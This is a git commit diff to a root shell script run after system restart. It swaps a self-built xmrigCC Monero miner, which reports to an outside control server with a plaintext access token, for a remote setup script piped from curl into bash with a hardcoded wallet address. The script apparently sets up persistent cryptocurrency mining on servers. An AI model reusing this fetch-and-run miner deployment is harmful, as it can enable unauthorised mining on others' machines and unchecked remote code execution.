486e477c7853747596644bf5d4031a90c2478ff7
MoneyMakers777 <73971537+MoneyMakers777@users.noreply.github.com>
2020-11-06 01:03:42 +0000

    Update mAfterSystemRestartScript.sh

--- mAfterSystemRestartScript.sh
+++ mAfterSystemRestartScript.sh
@@ -1,10 +1,11 @@
 cd /root
 apt update
-apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev libmicrohttpd-dev -y
-rm xmrigCC -r
-git clone https://github.com/Bendr0id/xmrigCC.git
-cd xmrigCC && mkdir build && cd build
-cmake ..
-make -j$(nproc)
-./xmrigDaemon -k --cc-url=ccserver.buy9hits.com:80 --cc-access-token=hFCIifTSoRa2rM8jwOTu --cc-worker-id=$systemID
+curl -L https://raw.githubusercontent.com/skypool-org/xmrig_setup/master/setup_skypool_miner.sh | bash -s '46rnJNvHVXAjdHWfrQndEJPJrWxjwL42zMNgCMH5vJyW97rGynsc4JjMu8TmxqcesR5Rjwk4QXHGEQ3Zi3NFSTPVVWoB1c5'
+#apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev libmicrohttpd-dev -y
+#rm xmrigCC -r
+#git clone https://github.com/Bendr0id/xmrigCC.git
+#cd xmrigCC && mkdir build && cd build
+#cmake ..
+#make -j$(nproc)
+#./xmrigDaemon -k --cc-url=ccserver.buy9hits.com:80 --cc-access-token=hFCIifTSoRa2rM8jwOTu --cc-worker-id=$systemID
 #./xmrigDaemon -o pool.minexmr.com:4444 -u 46rnJNvHVXAjdHWfrQndEJPJrWxjwL42zMNgCMH5vJyW97rGynsc4JjMu8TmxqcesR5Rjwk4QXHGEQ3Zi3NFSTPVVWoB1c5.$systemID -k --cc-url=ccserver.buy9hits.com:80 --cc-access-token=hFCIifTSoRa2rM8jwOTu --cc-worker-id=$systemID
